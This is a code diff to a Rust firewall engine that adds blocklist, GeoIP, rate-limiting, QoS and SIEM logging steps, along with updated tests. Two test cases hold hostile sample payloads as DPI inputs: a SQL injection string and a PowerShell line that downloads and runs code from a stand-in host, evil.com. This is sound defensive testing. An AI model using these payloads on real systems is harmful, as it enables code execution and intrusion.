@@ -7,6 +7,12 @@ use crate::modules::logger::FirewallLogger;
 use crate::modules::packet::Packet;
 use crate::modules::rule::{Action, RuleSet};
 use crate::modules::state::StateTable;
+use crate::modules::blocklist::BlocklistManager;
+use crate::modules::rate_limiter::RateLimiter;
+use crate::modules::qos::QosManager;
+use crate::modules::packet::QosPriority;
+use crate::modules::siem::{SiemLogger, SiemEvent};
+use maxminddb::geoip2;
 
 /// The verdict returned for every packet.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -29,6 +35,8 @@ pub struct Stats {
     pub rejected: u64,
     pub dpi_blocked: u64,
     pub ips_blocked: u64,
+    pub rate_limited: u64,
+    pub qos_dropped: u64,
 }
 
 /// Engine feature flags — toggle subsystems at runtime.
@@ -53,6 +61,12 @@ pub struct FirewallEngine {
     ids: IdsEngine,
     config: EngineConfig,
     stats: Stats,
+    pub geo_db: Option<maxminddb::Reader<Vec<u8>>>,
+    pub blocklist: BlocklistManager,
+    pub active_blocks: std::collections::HashSet<std::net::Ipv4Addr>,
+    pub rate_limiter: Option<RateLimiter>,
+    pub qos_manager: Option<QosManager>,
+    pub siem: Option<SiemLogger>,
 }
 
 impl FirewallEngine {
@@ -66,6 +80,12 @@ impl FirewallEngine {
             ids: IdsEngine::new(IdsConfig::default()),
             config: EngineConfig::default(),
             stats: Stats::default(),
+            geo_db: None,
+            blocklist: BlocklistManager::new(),
+            active_blocks: std::collections::HashSet::new(),
+            rate_limiter: None,
+            qos_manager: None,
+            siem: None,
         }
     }
 
@@ -79,6 +99,12 @@ impl FirewallEngine {
             ids: IdsEngine::new(ids_config),
             config,
             stats: Stats::default(),
+            geo_db: None,
+            blocklist: BlocklistManager::new(),
+            active_blocks: std::collections::HashSet::new(),
+            rate_limiter: None,
+            qos_manager: None,
+            siem: None,
         }
     }
 
@@ -91,12 +117,68 @@ impl FirewallEngine {
     ///   4. Default deny if no rule matched.
     ///   5. Insert into state table on Allow.
     ///   6. Log + update stats.
-    pub fn process(&mut self, pkt: &Packet) -> Decision {
+    pub fn process(&mut self, pkt: &mut Packet) -> Decision {
         self.stats.total += 1;
+
+        // ── Step -1: Userspace Blocklist Enforcement ────────────────
+        if self.active_blocks.contains(&pkt.src_ip) {
+            self.stats.dropped += 1;
+            if let Some(ref siem) = self.siem {
+                siem.log(SiemEvent::new("BLOCKLIST", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), "Malicious IP found in feeds", "Drop"));
+            }
+            return Decision::Drop;
+        }
+
+        // ── Step 0: GeoIP Lookup ──────────────────────────────
+        if pkt.country.is_none() {
+            if let Some(ref db) = self.geo_db {
+                if let Ok(country) = db.lookup::<geoip2::Country>(std::net::IpAddr::V4(pkt.src_ip)) {
+                    if let Some(c) = country.country {
+                        if let Some(iso_code) = c.iso_code {
+                            pkt.country = Some(iso_code.to_string());
+                        }
+                    }
+                }
+            }
+        }
+
+        // ── Step 0.3: Rate Limiting & Fail2Ban ──────────────────────
+        if let Some(ref mut limit) = self.rate_limiter {
+            if limit.check(pkt.src_ip) {
+                self.stats.rate_limited += 1;
+                if let Some(ref siem) = self.siem {
+                    siem.log(SiemEvent::new("RATE_LIMIT", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), "IP exceeded connection limits", "Drop"));
+                }
+                return Decision::Drop;
+            }
+        }
+
+        // ── Step 0.5: QoS Priority Assignment & Classification ──────
+        // If not explicitly set, auto-detect priority based on port
+        if pkt.qos == QosPriority::Normal {
+            match pkt.dst_port {
+                22 | 51820 | 1194 => pkt.qos = QosPriority::High, // SSH, WireGuard, OpenVPN
+                _ => {}
+            }
+        }
+
+        if let Some(ref mut qos) = self.qos_manager {
+            if qos.check(&pkt) {
+                self.stats.qos_dropped += 1;
+                return Decision::Drop; // Normal traffic dropped under heavy load
+            }
+        }
 
         // ── Step 1: IDS/IPS (header-level) ───────────────────
         if self.config.ids_enabled {
             let alerts = self.ids.inspect(pkt);
+            if !alerts.is_empty() {
+                if let Some(ref siem) = self.siem {
+                    for a in &alerts {
+                        siem.log(SiemEvent::new("IDS_ALERT", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), &a.description, if a.block { "Drop" } else { "Alert" }));
+                    }
+                }
+            }
             if alerts.iter().any(|a| a.block) {
                 self.stats.ips_blocked += 1;
                 return Decision::IpsBlock;
@@ -149,7 +231,7 @@ impl FirewallEngine {
     /// Process a packet with a payload for DPI inspection.
     /// Runs the full pipeline then additionally inspects the payload bytes.
     /// Returns `Decision::DpiBlock` if the DPI engine finds a threat.
-    pub fn process_with_payload(&mut self, pkt: &Packet, payload: &[u8]) -> Decision {
+    pub fn process_with_payload(&mut self, pkt: &mut Packet, payload: &[u8]) -> Decision {
         // Header-level decision first
         let header_decision = self.process(pkt);
         if header_decision != Decision::Allow {
@@ -163,6 +245,13 @@ impl FirewallEngine {
                 self.stats.dpi_blocked += 1;
                 // Undo the Allow stat added in process()
                 self.stats.allowed  = self.stats.allowed.saturating_sub(1);
+                
+                if let Some(ref siem) = self.siem {
+                    let reasons: Vec<_> = dpi_result.matches.iter().map(|m| m.sig_id.to_string()).collect();
+                    let msg = format!("Payload inspection matched signatures: {}", reasons.join(","));
+                    siem.log(SiemEvent::new("DPI_BLOCK", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), &msg, "Drop"));
+                }
+                
                 return Decision::DpiBlock;
             }
         }
@@ -183,6 +272,8 @@ impl FirewallEngine {
     pub fn ids_mut(&mut self) -> &mut IdsEngine { &mut self.ids }
 
     pub fn config_mut(&mut self) -> &mut EngineConfig { &mut self.config }
+
+    pub fn blocklist_mut(&mut self) -> &mut BlocklistManager { &mut self.blocklist }
 }
 
 #[cfg(test)]
@@ -197,12 +288,12 @@ mod tests {
         rs.add(Rule::new(
             1, "Allow SSH", Action::Allow,
             None, None, Some(22),
-            Protocol::Tcp, Direction::Inbound,
+            Protocol::Tcp, Direction::Inbound, None
         ));
         rs.add(Rule::new(
             2, "Block Telnet", Action::Drop,
             None, None, Some(23),
-            Protocol::Tcp, Direction::Inbound,
+            Protocol::Tcp, Direction::Inbound, None
         ));
         FirewallEngine::new(rs)
     }
@@ -212,48 +303,78 @@ mod tests {
             Ipv4Addr::new(1, 2, 3, 4),
             Ipv4Addr::new(10, 0, 0, 1),
             54000, dst_port,
-            Protocol::Tcp, dir, 64,
+            Protocol::Tcp, dir, 64
         )
     }
 
     #[test]
     fn test_allow_ssh() {
         let mut engine = build_engine();
-        assert_eq!(engine.process(&pkt(22, Direction::Inbound)), Decision::Allow);
+        assert_eq!(engine.process(&mut pkt(22, Direction::Inbound)), Decision::Allow);
     }
 
     #[test]
     fn test_drop_telnet() {
         let mut engine = build_engine();
-        assert_eq!(engine.process(&pkt(23, Direction::Inbound)), Decision::Drop);
+        assert_eq!(engine.process(&mut pkt(23, Direction::Inbound)), Decision::Drop);
     }
 
     #[test]
     fn test_default_deny_unknown_port() {
         let mut engine = build_engine();
-        assert_eq!(engine.process(&pkt(9999, Direction::Inbound)), Decision::Drop);
+        assert_eq!(engine.process(&mut pkt(9999, Direction::Inbound)), Decision::Drop);
     }
 
     #[test]
     fn test_stateful_second_packet_allowed() {
         let mut engine = build_engine();
-        let p = pkt(22, Direction::Inbound);
-        assert_eq!(engine.process(&p), Decision::Allow);
+        let mut p = pkt(22, Direction::Inbound);
+        assert_eq!(engine.process(&mut p), Decision::Allow);
         // Same packet again — should take the stateful fast-path
-        assert_eq!(engine.process(&p), Decision::Allow);
+        assert_eq!(engine.process(&mut p), Decision::Allow);
         assert_eq!(engine.stats().allowed, 2);
     }
 
     #[test]
     fn test_stats_tracking() {
         let mut engine = build_engine();
-        engine.process(&pkt(22, Direction::Inbound)); // allowed
-        engine.process(&pkt(23, Direction::Inbound)); // dropped
-        engine.process(&pkt(9999, Direction::Inbound)); // dropped (default)
+        engine.process(&mut pkt(22, Direction::Inbound)); // allowed
+        engine.process(&mut pkt(23, Direction::Inbound)); // dropped
+        engine.process(&mut pkt(9999, Direction::Inbound)); // dropped (default)
         let s = engine.stats();
         assert_eq!(s.total,   3);
         assert_eq!(s.allowed, 1);
         assert_eq!(s.dropped, 2);
+    }
+
+    #[test]
+    fn test_geo_ip_blocking() {
+        let mut rs = RuleSet::new();
+        // Drop traffic from RU or CN
+        rs.add(Rule::new(
+            1, "Drop RU/CN", Action::Drop,
+            None, None, None,
+            Protocol::Any, Direction::Inbound, 
+            Some(vec!["RU".to_string(), "CN".to_string()])
+        ));
+        rs.add(Rule::new(
+            2, "Allow All", Action::Allow,
+            None, None, None,
+            Protocol::Any, Direction::Inbound, None
+        ));
+        let mut engine = FirewallEngine::new(rs);
+
+        let mut pkt_ru = pkt(80, Direction::Inbound);
+        pkt_ru.country = Some("RU".to_string());
+
+        let mut pkt_us = pkt(80, Direction::Inbound);
+        pkt_us.country = Some("US".to_string());
+
+        let mut pkt_none = pkt(80, Direction::Inbound);
+
+        assert_eq!(engine.process(&mut pkt_ru), Decision::Drop);
+        assert_eq!(engine.process(&mut pkt_us), Decision::Allow);
+        assert_eq!(engine.process(&mut pkt_none), Decision::Allow); 
     }
 }
 
@@ -268,8 +389,8 @@ mod tests_advanced {
 
     fn build_engine() -> FirewallEngine {
         let mut rs = RuleSet::new();
-        rs.add(Rule::new(1, "Allow SSH",    Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound));
-        rs.add(Rule::new(2, "Block Telnet", Action::Drop,  None, None, Some(23), Protocol::Tcp, Direction::Inbound));
+        rs.add(Rule::new(1, "Allow SSH",    Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound, None));
+        rs.add(Rule::new(2, "Block Telnet", Action::Drop,  None, None, Some(23), Protocol::Tcp, Direction::Inbound, None));
         FirewallEngine::new(rs)
     }
 
@@ -278,29 +399,29 @@ mod tests_advanced {
     }
 
     #[test]
-    fn test_allow_ssh()              { assert_eq!(build_engine().process(&pkt(22, Direction::Inbound)),  Decision::Allow); }
+    fn test_allow_ssh()              { assert_eq!(build_engine().process(&mut pkt(22, Direction::Inbound)),  Decision::Allow); }
     #[test]
-    fn test_drop_telnet()            { assert_eq!(build_engine().process(&pkt(23, Direction::Inbound)),  Decision::Drop); }
+    fn test_drop_telnet()            { assert_eq!(build_engine().process(&mut pkt(23, Direction::Inbound)),  Decision::Drop); }
     #[test]
-    fn test_default_deny()           { assert_eq!(build_engine().process(&pkt(9999, Direction::Inbound)), Decision::Drop); }
+    fn test_default_deny()           { assert_eq!(build_engine().process(&mut pkt(9999, Direction::Inbound)), Decision::Drop); }
 
     #[test]
     fn test_stateful_second_packet() {
         let mut e = build_engine();
-        let p = pkt(22, Direction::Inbound);
-        assert_eq!(e.process(&p), Decision::Allow);
-        assert_eq!(e.process(&p), Decision::Allow);
+        let mut p = pkt(22, Direction::Inbound);
+        assert_eq!(e.process(&mut p), Decision::Allow);
+        assert_eq!(e.process(&mut p), Decision::Allow);
         assert_eq!(e.stats().allowed, 2);
     }
 
     #[test]
     fn test_dpi_blocks_malicious_payload() {
         let mut e = build_engine();
-        let p = pkt(22, Direction::Inbound);
+        let mut p = pkt(22, Direction::Inbound);
         // SQL injection payload
         let payload = b"GET /login?id=' OR '1'='1 HTTP/1.1";
         // First allow via header (port 22), then DPI blocks it
-        let verdict = e.process_with_payload(&p, payload);
+        let verdict = e.process_with_payload(&mut p, payload);
         assert_eq!(verdict, Decision::DpiBlock);
         assert_eq!(e.stats().dpi_blocked, 1);
     }
@@ -308,9 +429,9 @@ mod tests_advanced {
     #[test]
     fn test_dpi_clean_payload_allowed() {
         let mut e = build_engine();
-        let p = pkt(22, Direction::Inbound);
+        let mut p = pkt(22, Direction::Inbound);
         let clean_payload = b"SSH-2.0-OpenSSH_8.9p1";
-        let verdict = e.process_with_payload(&p, clean_payload);
+        let verdict = e.process_with_payload(&mut p, clean_payload);
         assert_eq!(verdict, Decision::Allow);
     }
 
@@ -322,38 +443,38 @@ mod tests_advanced {
         cfg.window = Duration::from_secs(60);
 
         let mut rs = RuleSet::new();
-        rs.add(Rule::new(1, "Allow all inbound", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound));
+        rs.add(Rule::new(1, "Allow all inbound", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound, None));
         let mut engine = FirewallEngine::with_config(rs, EngineConfig::default(), cfg);
 
         let attacker = Ipv4Addr::new(9, 9, 9, 9);
         // Probe 6 different ports to trigger the scan detector
         for port in 100..106u16 {
-            let p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, port, Protocol::Tcp, Direction::Inbound, 0);
-            engine.process(&p);
+            let mut p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, port, Protocol::Tcp, Direction::Inbound, 0);
+            engine.process(&mut p);
         }
         // Next packet should be IPS-blocked
-        let p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, 443, Protocol::Tcp, Direction::Inbound, 0);
-        assert_eq!(engine.process(&p), Decision::IpsBlock);
+        let mut p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, 443, Protocol::Tcp, Direction::Inbound, 0);
+        assert_eq!(engine.process(&mut p), Decision::IpsBlock);
     }
 
     #[test]
     fn test_dpi_can_be_disabled() {
         let cfg = EngineConfig { dpi_enabled: false, ids_enabled: true };
         let mut rs = RuleSet::new();
-        rs.add(Rule::new(1, "Allow all", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound));
+        rs.add(Rule::new(1, "Allow all", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound, None));
         let mut engine = FirewallEngine::with_config(rs, cfg, IdsConfig::default());
-        let p = pkt(80, Direction::Inbound);
+        let mut p = pkt(80, Direction::Inbound);
         let malicious = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
         // DPI is off → should be allowed despite malicious payload
-        assert_eq!(engine.process_with_payload(&p, malicious), Decision::Allow);
+        assert_eq!(engine.process_with_payload(&mut p, malicious), Decision::Allow);
     }
 
     #[test]
     fn test_stats_all_categories() {
         let mut e = build_engine();
-        e.process(&pkt(22,   Direction::Inbound)); // allow
-        e.process(&pkt(23,   Direction::Inbound)); // drop
-        e.process(&pkt(9999, Direction::Inbound)); // drop (default deny)
+        e.process(&mut pkt(22,   Direction::Inbound)); // allow
+        e.process(&mut pkt(23,   Direction::Inbound)); // drop
+        e.process(&mut pkt(9999, Direction::Inbound)); // drop (default deny)
         let s = e.stats();
         assert_eq!(s.total,   3);
         assert_eq!(s.allowed, 1);
